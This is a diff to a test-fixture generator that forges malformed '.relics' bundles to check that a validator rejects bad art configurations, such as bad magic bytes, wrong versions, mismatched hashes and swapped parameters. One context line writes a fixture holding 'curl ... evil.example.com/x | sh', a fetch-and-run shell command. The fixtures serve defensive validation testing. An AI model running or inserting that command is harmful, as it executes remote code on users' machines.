@@ -16,7 +16,7 @@
 import { mkdirSync, writeFileSync, rmSync, readFileSync, cpSync, readdirSync } from "node:fs";
 import { join, dirname } from "node:path";
 import { fileURLToPath } from "node:url";
-import { assembleBundle, validateBundleBytes, readContainer, toStudioDraft, utf8, sha256Utf8, stableJsonText, buildRenderContext, safeJsonParse, fromUtf8 } from "../index.js";
+import { assembleBundle, validateBundleBytes, readContainer, toStudioDraft, utf8, sha256Utf8, stableJsonText, buildRenderContext, safeJsonParse, fromUtf8, keccak256Hex, encodeArtConfigV1 } from "../index.js";
 import { createVmModule } from "../../creator-cli/src/sandbox.js";
 import { forgeZip } from "./forge-zip.mjs";
 
@@ -146,6 +146,43 @@ const goodProbe = assembleBundle({ files: goodFiles, config: goodConfig });
 const goodBundle = assembleBundle({ files: goodFiles, config: goodConfig, representativeOutputs: renderBindingSeeds(goodProbe.entries, goodProbe.manifest).digests });
 /** @type {Map<string, Uint8Array>} */
 const goodEntries = goodBundle.entries;
+
+/**
+ * A SECOND base bundle, on the Solidity runtime, because the ACV1 attacks below cannot be expressed
+ * against a JavaScript project at all: its `artConfig` is the generator file, so there is no
+ * configuration document to malform. Every art-configuration fixture is forged from this one.
+ */
+const solidityFiles = templateFiles("solidity-svg-params");
+const solidityConfig = templateConfig("solidity-svg-params");
+const solidityProbe = assembleBundle({ files: solidityFiles, config: solidityConfig });
+const solidityBundle = assembleBundle({
+  files: solidityFiles,
+  config: solidityConfig,
+  representativeOutputs: renderBindingSeeds(solidityProbe.entries, solidityProbe.manifest).digests,
+});
+const solidityEntries = solidityBundle.entries;
+
+/** `withEntries`, against the Solidity base. */
+function withSolidityEntries(overrides) {
+  const map = new Map(solidityEntries);
+  for (const [path, value] of Object.entries(overrides)) {
+    if (value === null) map.delete(path);
+    else map.set(path, typeof value === "string" ? utf8(value) : value);
+  }
+  return forgeZip([...map].map(([path, bytes]) => ({ path, bytes })));
+}
+
+/** `manifestWith`, against the Solidity base. */
+function solidityManifestWith(mutate) {
+  const manifest = JSON.parse(fromUtf8(solidityEntries.get("relics.project.json")));
+  mutate(manifest);
+  return stableJsonText(manifest);
+}
+
+/** The creator's ACV1 authoring document, as shipped, for a fixture to bend one field of. */
+function solidityParams() {
+  return JSON.parse(fromUtf8(solidityEntries.get("generator/params.json")));
+}
 
 const asForgeEntries = (overrides = new Map(), extra = []) =>
   [...goodEntries]
@@ -601,6 +638,148 @@ emit(
   withEntries({ "assets/install.sh": "#!/bin/sh\ncurl -s https://evil.example.com/x | sh\n" }),
   { attack: "a shell script riding along in assets/", refusedBy: "validator", expect: { checkFails: "LAYOUT_AND_PATHS", codes: ["BUNDLE_PATH_POLICY"] } },
 );
+
+
+// ---- the art configuration itself ---------------------------------------------------------
+//
+// SCHEMA 3'S CENTRAL CLAIM IS THAT A BUNDLE STATES THE ART ITS LAUNCH WOULD CARRY. These are the
+// ways a forger, or a broken tool, could state something else. All are refused before a container
+// is written — the on-chain validator would refuse them too, but only after the creator paid for
+// the transaction.
+
+emit("art-config-missing.relics", withSolidityEntries({ "generator/params.json": null }), {
+  attack: "a Solidity project with no art configuration at all",
+  refusedBy: "validator",
+  expect: { checkFails: "ART_BINDING", codes: ["ART_BINDING_CONFIG_MISSING"] },
+  note: "The bundle that used to launch happily and render the runtime's built-in shapes instead of the creator's art. There is no default configuration to fall back to, by design.",
+});
+
+emit(
+  "art-config-four-byte-blob.relics",
+  withSolidityEntries({
+    "relics.project.json": solidityManifestWith((m) => {
+      // Four bytes of "look data" — the shape that made every project launchable with no art.
+      const blob = Uint8Array.from([0xde, 0xad, 0xbe, 0xef]);
+      m.artBinding.artConfig = bytesToHex(blob);
+      m.artBinding.artConfigBytes = 4;
+      m.artBinding.artConfigHash = keccak256Hex(blob);
+    }),
+  }),
+  {
+    attack: "four bytes of opaque look data standing in for an art configuration",
+    refusedBy: "validator",
+    expect: { checkFails: "ART_BINDING", codes: ["ART_BINDING_CONFIG_FORMAT", "ART_BINDING_MISMATCH"] },
+    note: "The hash is internally consistent — it really is keccak256 of those four bytes. Still refused: the format check reads the magic, and the binding is recomputed from the creator's own params.json.",
+  },
+);
+
+emit(
+  "art-config-bad-magic.relics",
+  withSolidityEntries({
+    "relics.project.json": solidityManifestWith((m) => {
+      const bytes = hexToBytes(m.artBinding.artConfig);
+      bytes[0] = 0x42;
+      m.artBinding.artConfig = bytesToHex(bytes);
+      m.artBinding.artConfigHash = keccak256Hex(bytes);
+    }),
+  }),
+  {
+    attack: "a configuration whose magic is not ACV1",
+    refusedBy: "validator",
+    expect: { checkFails: "ART_BINDING", codes: ["ART_BINDING_CONFIG_FORMAT", "ART_BINDING_MISMATCH"] },
+  },
+);
+
+emit(
+  "art-config-bad-version.relics",
+  withSolidityEntries({
+    "relics.project.json": solidityManifestWith((m) => {
+      const bytes = hexToBytes(m.artBinding.artConfig);
+      bytes[4] = 2;
+      m.artBinding.artConfig = bytesToHex(bytes);
+      m.artBinding.artConfigHash = keccak256Hex(bytes);
+    }),
+  }),
+  {
+    attack: "a configuration claiming a format version nothing implements",
+    refusedBy: "validator",
+    expect: { checkFails: "ART_BINDING", codes: ["ART_BINDING_CONFIG_INVALID", "ART_BINDING_MISMATCH"] },
+    note: "ACV1's version byte is checked for exact equality with 1. A future format is a new parser, never a negotiated field.",
+  },
+);
+
+emit(
+  "art-config-out-of-range.relics",
+  withSolidityEntries({
+    "generator/params.json": stableJsonText(
+      (() => {
+        const params = solidityParams();
+        // FRAGMENTATION is the organic swap COUNT. As a layer magnitude it would let 100 swaps of
+        // $1 walk the artwork 100 steps while one $100 swap moved it once.
+        params.layers[0].sensor = "FRAGMENTATION";
+        return params;
+      })(),
+    ),
+  }),
+  {
+    attack: "a layer driven by FRAGMENTATION, the one sensor a layer may not name",
+    refusedBy: "validator",
+    expect: { checkFails: "ART_BINDING", codes: ["ART_BINDING_CONFIG_MISSING"] },
+    note: "Refused while deriving the configuration, so the bundle cannot be assembled at all. FRAGMENTATION stays legal as a TRAIT source, where it is labelled for what it is and cannot masquerade as a magnitude.",
+  },
+);
+
+emit(
+  "art-config-params-mismatch.relics",
+  withSolidityEntries({
+    "relics.project.json": solidityManifestWith((m) => {
+      const swapped = encodeArtConfigV1({
+        version: 1,
+        format: "ACV1",
+        title: "Not This Project",
+        animate: false,
+        background: 0,
+        palette: ["#ffffff", "#ff0000"],
+        layers: [{ kind: "BARS", sensor: "EPOCH", curve: "STEP", palette: 1, amountMin: 1, amountMax: 2 }],
+        traits: [],
+      });
+      m.artBinding.artConfig = bytesToHex(swapped);
+      m.artBinding.artConfigBytes = swapped.length;
+      m.artBinding.artConfigHash = keccak256Hex(swapped);
+    }),
+  }),
+  {
+    attack: "a manifest carrying a different artwork than the creator's parameters describe",
+    refusedBy: "validator",
+    expect: { checkFails: "ART_BINDING", codes: ["ART_BINDING_MISMATCH"] },
+    note: "Every field is self-consistent and the configuration is perfectly valid ACV1. It is refused because the binding is RECOMPUTED from generator/params.json, so a manifest cannot describe art the project does not contain.",
+  },
+);
+
+emit(
+  "art-config-hash-lie.relics",
+  withSolidityEntries({
+    "relics.project.json": solidityManifestWith((m) => {
+      m.artBinding.artConfigHash = keccak256Hex(utf8("not the configuration"));
+    }),
+  }),
+  {
+    attack: "a config hash that is not keccak256 of the config beside it",
+    refusedBy: "validator",
+    expect: { checkFails: "ART_BINDING", codes: ["ART_BINDING_CONFIG_HASH", "ART_BINDING_MISMATCH"] },
+    note: "On chain this is BadArtHash in LaunchpadFactory._storeArt. Here it costs nothing to discover.",
+  },
+);
+
+function hexToBytes(hex) {
+  const out = new Uint8Array(hex.length / 2);
+  for (let i = 0; i < out.length; i++) out[i] = parseInt(hex.slice(i * 2, i * 2 + 2), 16);
+  return out;
+}
+
+function bytesToHex(bytes) {
+  return [...bytes].map((b) => b.toString(16).padStart(2, "0")).join("");
+}
 
 writeFileSync(
   join(HOSTILE, "expectations.json"),
